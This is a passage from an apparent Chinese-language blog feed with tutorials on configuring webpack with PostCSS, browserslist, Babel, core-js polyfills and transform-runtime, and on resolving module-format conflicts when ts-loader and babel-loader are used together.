class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">color</span>: pink;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行 webpack 构建指令后，查看编译后的代码：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.hello</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: pink;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.hello</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: pink;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>默认情况下，postcss-preset-env 会自动按照 browserslist 的默认兼容策略来编译 css，按照默认策略可以兼容 80% 以上的浏览器。</p><p>browserslist 是一个用于专门声明当前项目的目标浏览器的配置文件，如果我们要调整 postcss-preset-env 的默认兼容策略，就可以在项目根目录创建一个 <code>.browserslistrc</code> 的文件，并编写对应的配置，如下是一个提供更广泛兼容的配置，它兼容了全世界市场占用率大于 0.5% 的浏览器，并兼容所有主流浏览器（包括已经停止更新的）的最后两个版本：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; 0.5%, last 2 versions</span><br></pre></td></tr></table></figure><p>使用了这个配置后你就会发现编译出的代码变得更大了，很多属性都被添加了 css 属性前缀，因为它需要兼容更多的浏览器。</p><blockquote><p>你可以在 <a href="https://browsersl.ist/#q=defaults">browsersl.ist</a> 网站上查看 browserslist 的配置规则</p></blockquote><h2 id="进阶：babel"><a href="#进阶：babel" class="headerlink" title="进阶：babel"></a>进阶：babel</h2><p><a href="https://babeljs.io/">Babel</a> 与 PostCSS 类似，都是一种语言的编译器，PostCSS 负责处理 CSS 而 Babel 负责处理 JavaScript。通过使用 Babel，能够将高级版本的 JavaScript 代码转换为向后兼容的版本，以便能够在老版本的浏览器或环境中运行。</p><p>首先，我们要安装 <a href="https://www.npmjs.com/package/@babel/core">@babel/core</a> 来提供 babel 的核心支持，同时还需要安装 <a href="https://www.npmjs.com/package/babel-loader">babel-loader</a> 来让 webpack 能够调用 babel：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pnpm install @babel/core babel-loader -D</span><br></pre></td></tr></table></figure><p>然后在 webpack 中添加对应的 loader:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="comment">// webpack 其他配置</span></span><br><span class="line">  <span class="attr">module</span>: &#123;</span><br><span class="line">    <span class="attr">rules</span>: [</span><br><span class="line">      <span class="comment">// ... 其他 loader ...</span></span><br><span class="line">      <span class="comment">// 处理 js 文件</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.(?:js|mjs|cjs)$/</span>, <span class="comment">// 匹配 js、mjs、cjs 后缀的文件</span></span><br><span class="line">        <span class="attr">exclude</span>: <span class="regexp">/node_modules/</span>, <span class="comment">// 从 node_modules 引入的 js 代码不需要 babel 参与编译（因为大多数包已经被编译好了）</span></span><br><span class="line">        <span class="attr">use</span>: &#123;</span><br><span class="line">          <span class="attr">loader</span>: [<span class="string">&#x27;babel-loader&#x27;</span>],</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>为了使 babel 生效，与 PostCSS 类似的，我们需要一个 babel 的配置文件，在项目的根目录下创建一个 <code>babel.config.js</code> 文件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">presets</span>: [</span><br><span class="line">    <span class="comment">// 添加你想使用的预设</span></span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以发现，Babel 的配置文件与 PostCSS 的配置文件是类似的，因为它们的工作原理都是本身提供一个核心库的支持，而具体的工作则需要对应的插件来完成，因此我们需要安装对应的插件。</p><p>在没有什么其他需求的情况下，我们可以安装 <a href="https://www.npmjs.com/package/@babel/preset-env">@babel/preset-env</a> 插件来提供一个较为全面的预设配置，改配置可以将现代 JavaScript 代码转换为向后兼容的版本，以便能够在老版本的浏览器或环境中运行。</p><p>首先我们安装该插件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pnpm install @babel/preset-env -D</span><br></pre></td></tr></table></figure><p>然后在 <code>babel.config.js</code> 中添加该插件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">presets</span>: [</span><br><span class="line">    [</span><br><span class="line">      <span class="string">&#x27;@babel/preset-env&#x27;</span>,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// preset config</span></span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>还记得在上一步我们编写的 browserslist 配置吗？<code>@babel/preset-env</code> 同样会根据它来生成对应目标的兼容代码。</p><p>当我们执行 webpack 编译指令后，可以发现编译出的代码中，箭头函数、const、let 等新特性都被转换成了 ES5 的代码。以 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/Optional_chaining">可选链运算符</a> 为例子，原代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> o = &#123; <span class="attr">a</span>: <span class="number">123</span> &#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o?.<span class="property">a</span> ?? <span class="string">&#x27;nothing&#x27;</span>);</span><br></pre></td></tr></table></figure><p>为了兼容大部分的浏览器，babel 将可选链操作符进行转换为三元运算符，得出编译后的代码为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(</span><br><span class="line">  <span class="literal">null</span> !== (n = <span class="literal">null</span> == a ? <span class="keyword">void</span> <span class="number">0</span> : a.<span class="property">a</span>) &amp;&amp; <span class="keyword">void</span> <span class="number">0</span> !== n ? n : <span class="string">&#x27;nothing&#x27;</span>,</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>很多人 babel 配置到这里就觉得万事大吉了，但实际上编译出来的代码并没有按照预想的那样去兼容到低版本浏览器。因为 babel 只会转换新的 JavaScript 语法，但是不会转换新的 API，也就是说，Babel 可以将你的箭头函数、const、let 等新语法转换成 ES5 的代码，但是它不会将 Promise、Array.from、Object.assign 等新的 API、对象转化为 ES5 环境可用的代码。</p><p>因此我们如果想要让 ES5 环境的浏览器支持这些新的 API，就需要去实现它们，这种实现被称为 polyfill（语法垫片）。@babel/preset-env 支持引入需要的 polyfill，但是 preset-env 并没有这些 polyfill 的实现，因此我们需要安装 <a href="https://www.npmjs.com/package/core-js">core-js</a>，core-js 是一个提供了大量 polyfill 的库，它的 polyfill 覆盖了 ES5、ES6、ES7、ES8、ES9、ES10、ES11、ES12 等所有的 ECMAScript 标准。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pnpm install core-js</span><br></pre></td></tr></table></figure><p>然后，需要在 <code>babel.config.js</code> 中添加 <code>core-js</code> 的配置：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">presets</span>: [</span><br><span class="line">    [</span><br><span class="line">      <span class="string">&#x27;@babel/preset-env&#x27;</span>,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">corejs</span>: <span class="number">3</span>, <span class="comment">// 指定 core-js 版本</span></span><br><span class="line">        <span class="attr">useBuiltIns</span>: <span class="string">&#x27;usage&#x27;</span>, <span class="comment">// 按需引入 polyfill</span></span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>运行构建指令后，我们会发现构建产出大了很多，这是因为 babel 从 core-js 引入了当前项目所需要的 polyfill。</p><blockquote><p>在决定是否使用 core-js 时，一定要考虑到你的项目是否真的需要这些 polyfill，比如项目如果使用 Vue3，那么就不需要引入大量为了兼容 ES5 环境的 polyfill，因为 Vue3 本身就是基于 ES6 环境开发的。</p></blockquote><p>但是此时还存在两个问题需要解决：</p><ol><li>babel 会将 core-js 的 polyfill 还有一些 helper 函数打包到每个文件中，这样会导致每个文件都包含了重复的代码，从而导致打包后的文件体积变大。</li><li>babel 引入的 polyfill 函数会污染全局环境，这样会导致全局环境中存在大量的 polyfill 函数，这些函数可能会与其他库冲突。</li></ol><p>为了解决这两个问题，我们需要安装 <a href="https://www.npmjs.com/package/@babel/plugin-transform-runtime">@babel/plugin-transform-runtime</a> 插件（需要 @babel/runtime 支持），它会将 babel 重复引用的函数转换为 runtime 函数，从而解决上面的问题，并减少打包后的文件体积。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pnpm install @babel/plugin-transform-runtime @babel/runtime -D</span><br></pre></td></tr></table></figure><p>然后在 <code>babel.config.js</code> 中添加该插件：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">presets</span>: [</span><br><span class="line">    [</span><br><span class="line">      <span class="string">&#x27;@babel/preset-env&#x27;</span>,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">corejs</span>: <span class="number">3</span>, <span class="comment">// 指定 core-js 版本</span></span><br><span class="line">        <span class="attr">useBuiltIns</span>: <span class="string">&#x27;usage&#x27;</span>, <span class="comment">// 按需引入 polyfill</span></span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">plugins</span>: [<span class="string">&#x27;@babel/plugin-transform-runtime&#x27;</span>],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webpack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在 Webpack 中同时使用 ts-loader 和 babel-loader</title>
      <link href="/2023/12/88456067f15c.html"/>
      <url>/2023/12/88456067f15c.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-为什么要同时使用-ts-loader-和-babel-loader"><a href="#1-为什么要同时使用-ts-loader-和-babel-loader" class="headerlink" title="1. 为什么要同时使用 ts-loader 和 babel-loader"></a>1. 为什么要同时使用 ts-loader 和 babel-loader</h1><p>在使用 Webpack 构建 TypeScript 项目时，我们通常会使用 <code>ts-loader</code> 来加载 ts 代码，<code>ts-loader</code> 会根据目标 <code>tsconfig.json</code> 文件调用 TypeScript Compiler 来对 ts 文件进行编译。</p><p>我们可以在 <code>tsconfig.json</code> 中可以通过 <code>target</code> 选项来指定输出的 ES 版本，但是 TypeScript 编译后的代码只支持对语法的转义，比如将 ES6 的箭头函数转为 ES5 支持的函数写法，而那些高版本 ES 中的新特性，比如 Promise、Map、Set，经过 TypeScript 编译器编译后的代码如果只在 ES5 环境的浏览器中运行，那么这些对象还是 undefined。这是因为 TypeScript 编译器只支持语法降级，但并不会添加语法垫片（polyfill）。</p><blockquote><p>有些同学可能会被 <code>tsconfig.json</code> 中的 <code>lib</code> 配置项给误导到，实际上 lib 只是引入了某些语法的类型声明，并不会添加语法垫片。</p></blockquote><p>但是 babel 是支持为高版本的 ES 代码添加语法垫片的，因此如果我们需要让 ts 代码完全支持低版本的浏览器，就需要在 webpack 配置中添加 babel-loader 到 ts-loader 的流程中，让 ts-loader 编译后的代码再过一遍 babel-loader。</p><blockquote><p>注意：本文只在阐述使用 ts-loader 时，同时使用 babel-loader 的情况，但并不意味着你必须使用 ts-loader 来处理 TypeScript 代码，babel 也可以编译 TypeScript 代码，如果你的开发流程中明确不会使用 ts-loader 你完全可以将 ts 代码也交给 babel-loader 处理，那么也不需要看本文了。</p></blockquote><p>我们可以将 webpack 的配置修改为：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="attr">config</span>: <span class="title class_">WebpackConfiguration</span> = &#123;</span><br><span class="line">  <span class="comment">// ... 其他配置</span></span><br><span class="line">  <span class="attr">module</span>: &#123;</span><br><span class="line">    <span class="attr">rules</span>: [</span><br><span class="line">      <span class="comment">// ... 其他 loader ...</span></span><br><span class="line">      <span class="comment">// 处理 ts 文件</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">test</span>: <span class="regexp">/\.tsx?$/i</span>,</span><br><span class="line">        <span class="attr">use</span>: [</span><br><span class="line">          <span class="string">&#x27;babel-loader&#x27;</span>,</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="attr">loader</span>: <span class="string">&#x27;ts-loader&#x27;</span>,</span><br><span class="line">            <span class="attr">options</span>: &#123;</span><br><span class="line">              <span class="comment">// 指定特 tsconfig 的位置，也可以不指定，默认使用项目根目录的 tsconfig.json</span></span><br><span class="line">              <span class="attr">configFile</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&#x27;./tsconfig.json&#x27;</span>),</span><br><span class="line">            &#125;,</span><br><span class="line">          &#125;,</span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">exclude</span>: <span class="regexp">/node_modules/</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="comment">// ... ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>tsconfig.json：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;compilerOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ESNext&quot;</span><span class="punctuation">,</span> <span class="comment">// 因为语法转换交给 Babel 处理，因此目标语法为 ESNext，即不让 tsc 处理最新的语法</span></span><br><span class="line">    <span class="attr">&quot;module&quot;</span><span class="punctuation">:</span> <span class="string">&quot;CommonJS&quot;</span><span class="punctuation">,</span> <span class="comment">// 使用 CommonJS 规范</span></span><br><span class="line">    <span class="attr">&quot;moduleResolution&quot;</span><span class="punctuation">:</span> <span class="string">&quot;node10&quot;</span><span class="punctuation">,</span> <span class="comment">// 模块解析方式，不配置在引用模块时如果不是完整路径会报错</span></span><br><span class="line">    <span class="attr">&quot;baseUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;paths&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@/*&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;src/*&quot;</span><span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="comment">// 配置路径别名，主要让 vscode 识别，跟 webpack.config.js 中的 alias 保持对应</span></span><br><span class="line">    <span class="attr">&quot;allowJs&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span><span class="punctuation">,</span> <span class="comment">// 允许编译 js 文件</span></span><br><span class="line">    <span class="attr">&quot;outDir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./dist&quot;</span> <span class="comment">// 编译产出，我们使用 webpack 不会根据这里的配置走，但是如果不配置 tsconfig 会报错</span></span><br><span class="line">    <span class="comment">// 其余配置保持默认不改动</span></span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>babel.config.cjs</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">presets</span>: [</span><br><span class="line">    [</span><br><span class="line">      <span class="string">&#x27;@babel/preset-env&#x27;</span>,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">corejs</span>: <span class="number">3</span>, <span class="comment">// 为代码添加语法垫片</span></span><br><span class="line">        <span class="attr">useBuiltIns</span>: <span class="string">&#x27;usage&#x27;</span>,</span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">  <span class="string">&#x27;@babel/plugin-transform-runtime&#x27;</span>, <span class="comment">// 优化编译产出</span></span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="2-发现问题"><a href="#2-发现问题" class="headerlink" title="2. 发现问题"></a>2. 发现问题</h1><p>思路是没问题的，但是如果我们按照上面的配置去编译现有的代码，可能会遇到编译失败的情况，如：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202312201124489.png" alt=""></p><p>也可能遇到编译成功了但是浏览器无法运行的情况，如：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202312201125078.png" alt=""></p><p>这些问题都是因为 TypeScript 编译器与 Babel 在包模块规范上产生了冲突。</p><p>通常情况下，如果我们的项目使用了 TypeScript， <code>tsconfig.json</code> 中配置的 <code>module</code> 为 <code>CommonJS</code>，就意味着 TypeScript 会将我们的 ESM 规范的代码转义为 CommonJS 规范；然而当代码交给 Babel 处理时，<code>@babel/preset-env</code> 会对 TypeScript 转化后的 CommonJS 代码判断有问题（不知道是不是 bug），导致代码没有从 CommonJS 转换为浏览器可以识别的模块语法；同时，由于 TypeScript 将 ESM 转为了 CommonJS，用于区分 ESM 规范的 <code>__esModule</code> 也被占用了，就会导致某些 babel 的 plugin 也出现无法编译的报错。</p><h1 id="3-问题解决"><a href="#3-问题解决" class="headerlink" title="3. 问题解决"></a>3. 问题解决</h1><h2 id="修正-babel-preset-env-的模块规范判断"><a href="#修正-babel-preset-env-的模块规范判断" class="headerlink" title="修正 @babel/preset-env 的模块规范判断"></a>修正 <code>@babel/preset-env</code> 的模块规范判断</h2><p>我们只需要添加 <code>modules: &quot;cjs&quot;</code> 到 <code>@babel/preset-env</code> 的配置项中，让 Babel 将 ESM 转为 CommonJS（原来由 <a href="https://babeljs.io/docs/babel-plugin-transform-modules-commonjs">@babel/plugin-transform-modules-commonjs</a> 实现），即可让 Babel 成功编译由 TypeScript 编译出的 CommonJS 规范的代码：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">module.exports = &#123;</span><br><span class="line">  presets: [</span><br><span class="line">    [</span><br><span class="line">      &#x27;@babel/preset-env&#x27;,</span><br><span class="line">      &#123;</span><br><span class="line">        corejs: 3, // 为代码添加语法垫片</span><br><span class="line">        useBuiltIns: &#x27;usage&#x27;,</span><br><span class="line"><span class="addition">+       modules: &quot;cjs&quot;,</span></span><br><span class="line">      &#125;,</span><br><span class="line">    ],</span><br><span class="line">  ],</span><br><span class="line">  plugins: [</span><br><span class="line">  &#x27;@babel/plugin-transform-runtime&#x27;, // 优化编译产出</span><br><span class="line">  ],</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="让-TypeScript-编译出-ESM-规范的代码"><a href="#让-TypeScript-编译出-ESM-规范的代码" class="headerlink" title="让 TypeScript 编译出 ESM 规范的代码"></a>让 TypeScript 编译出 ESM 规范的代码</h2><p>最简单的一种理解是让 TypeScript 编译出 ESM 模块规范的代码，这样代码的转化就还是跟 babel-loader 处理普通的 js 代码一样，代码由 ESM 转为浏览器可以运行的代码。</p><p>首先我们需要将 <code>tsconfig.json</code> 做出一些变更，让 TypeScript 可以编译出 ESM 规范的代码：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">//... ...</span><br><span class="line"><span class="deletion">-   &quot;module&quot;: &quot;CommonJS&quot;,</span></span><br><span class="line"><span class="addition">+   &quot;module&quot;: &quot;ESNext&quot;,</span></span><br><span class="line"><span class="deletion">-   &quot;module&quot;: &quot;CommonJS&quot;,</span></span><br><span class="line"><span class="addition">+   &quot;module&quot;: &quot;ESNext&quot;,</span></span><br><span class="line"><span class="addition">+   &quot;esModuleInterop&quot;: true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后，修改 <code>package.json</code> 的 <code>type</code> 为 <code>module</code>，标记当前项目为 ESM 规范：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;@webpack-playground/html-ts&quot;,</span><br><span class="line"><span class="addition">+ &quot;type&quot;: &quot;module&quot;,</span></span><br><span class="line">  // ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果项目内有 <code>.cjs</code> 模块，则需要转为 <code>.mjs</code>，如：</p><ul><li>babel.config.cjs =&gt; babel.config.mjs</li><li>postcss.config.cjs =&gt; postcss.config.mjs</li></ul><p>此时执行 webpack 指令时会报错，因为 webpack 调用的 ts-node 并没有使用 esm 的加载器，会被 node 监测出在 <code>type: &quot;module&quot;</code> 的项目中使用了 CommonJS 规范。那么需要指定 webpack 的模块加载器为 <code>ts-node/esm</code>，修改 package.json 中的 script：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;@webpack-playground/html-ts&quot;,</span><br><span class="line">  &quot;type&quot;: &quot;module&quot;,</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line"><span class="deletion">-   &quot;dev&quot;: &quot;cross-env NODE_ENV=development webpack serve --config webpack.config.ts&quot;,</span></span><br><span class="line"><span class="addition">+   &quot;dev&quot;: &quot;cross-env NODE_ENV=development node --loader ts-node/esm node_modules/webpack-cli/bin/cli.js serve --config webpack.config.ts&quot;,</span></span><br><span class="line"><span class="deletion">-   &quot;build&quot;: &quot;cross-env NODE_ENV=production webpack --config webpack.config.ts&quot;,</span></span><br><span class="line"><span class="addition">+   &quot;build&quot;: &quot;cross-env NODE_ENV=production node --loader ts-node/esm node_modules/webpack-cli/bin/cli.js --config webpack.config.ts&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  // ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此外如果使用了 CommonJS 中的语法，比如 <code>__dirname</code> 需要添加语法垫片：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> url <span class="keyword">from</span> <span class="string">&#x27;url&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> __dirname = url.<span class="title function_">fileURLToPath</span>(<span class="keyword">new</span> <span class="title function_">URL</span>(<span class="string">&#x27;.&#x27;</span>, <span class="keyword">import</span>.<span class="property">meta</span>.<span class="property">url</span>));</span><br></pre></td></tr></table></figure><p>这样，项目内的 ts 代码经过 tsc 编译后就会编译为 ESM 规范的代码，ESM 规范的代码再交由 Babel 和 Webpack 处理就没有问题了。</p><p>如果项目不方便修改 <code>package.json</code> 中的 <code>module</code>，那么还可以单独为 ts-loader 编写一个 <code>tsconfig.json</code> 配置进行加载，比如创建一个 <code>tsconfig-project.json</code>：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;compilerOptions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ESNext&quot;</span><span class="punctuation">,</span> <span class="comment">// 因为语法转换交给 Babel 处理，因此目标语法为 ESNext，即不让 tsc 处理最新的语法</span></span><br><span class="line">    <span class="attr">&quot;module&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ESNext&quot;</span><span class="punctuation">,</span> <span class="comment">// 使用 ESM 规范</span></span><br><span class="line">    <span class="attr">&quot;moduleResolution&quot;</span><span class="punctuation">:</span> <span class="string">&quot;node10&quot;</span><span class="punctuation">,</span> <span class="comment">// 模块解析方式，不配置在引用模块时如果不是完整路径会报错</span></span><br><span class="line">    <span class="attr">&quot;baseUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;paths&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@/*&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;src/*&quot;</span><span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="comment">// 配置路径别名，主要让 vscode 识别，跟 webpack.config.js 中的 alias 保持对应</span></span><br><span class="line">    <span class="attr">&quot;allowJs&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span><span class="punctuation">,</span> <span class="comment">// 允许编译 js 文件</span></span><br><span class="line">    <span class="attr">&quot;outDir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./dist&quot;</span><span class="punctuation">,</span> <span class="comment">// 编译产出，我们使用 webpack 不会根据这里的配置走，但是如果不配置 tsconfig 会报错</span></span><br><span class="line">    <span class="attr">&quot;esModuleInterop&quot;</span><span class="punctuation">:</span> <span 